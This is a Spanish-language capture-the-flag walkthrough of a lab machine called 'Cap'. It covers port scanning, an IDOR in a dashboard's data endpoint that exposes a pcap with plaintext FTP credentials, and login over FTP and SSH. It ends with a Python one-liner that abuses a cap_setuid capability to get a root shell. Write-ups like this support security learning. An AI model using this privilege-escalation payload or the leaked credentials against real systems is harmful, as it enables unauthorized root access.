# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
└─$ sudo AutoNmap.sh 10.129.38.44
AutoNmap By JBKira
Puertos TCP abiertos:
21,22,80
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
```

>Al acceder al sitio web podemos ver lo siguiente:

![image](https://github.com/user-attachments/assets/41b03570-9f9b-4f91-8ee0-79f47bd87ff2)

>En la siguiente pestaña vemos que en la url se apunta a un data/1, vamos a probar si es vulnerable a IDOR (Insecure Direct Object Reference):

![image](https://github.com/user-attachments/assets/7bd3ca79-111b-4628-ac61-dd9ba2c4823b)

>Para ello abriremos burpsuite e interceptaremos la conexión:

```bash
burpsuite &>/dev/null & disown
```

>Tras probar diversos id vemos que el id 0 nos da datos, por lo que vamos a verlo en el navegador para poder emplear el botón de download previamente visto:

![image](https://github.com/user-attachments/assets/67de10f2-4e80-4c7d-97a6-8309dc272292)

>Esto nos descargará un archivo .pcap el cual podemos abrir con wireshark dándole click derecho abrir con wireshark, en este podemos encontrar credenciales para el usuario nathan que fueron enviadas por texto plano por FTP: `nathan:Buck3tH4TF0RM3!`

![image](https://github.com/user-attachments/assets/9fcd1266-4dab-4b96-b70d-bd20b6f733c6)

>Si nos logueamos por ftp veremos la flag user.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
└─$ ftp 10.129.38.44  
Connected to 10.129.38.44.
220 (vsFTPd 3.0.3)
Name (10.129.38.44:kali): nathan 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28161|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Apr 16 18:38 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||21664|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |*******************************************************************************************************************************|    33      644.53 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.49 KiB/s)
```

>Además, las credenciales son válidas para loguearnos mediante ssh:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
└─$ ssh nathan@10.129.38.44                                                                            
<SNIP>
nathan@cap:~$
```

# Privilege Escalation

>Si listamos las capabilities de los archivos del sistema vemos las siguientes, de las cuales la interesante es la cap_setuid del binario de python:

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

>Esta capability se puede explotar para ejecutar una shell como el usuario root de la siguiente forma:

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```

>Ahora podemos ir a /root y encontrar la flag root.txt:

```bash
# ls /root
root.txt  snap
```
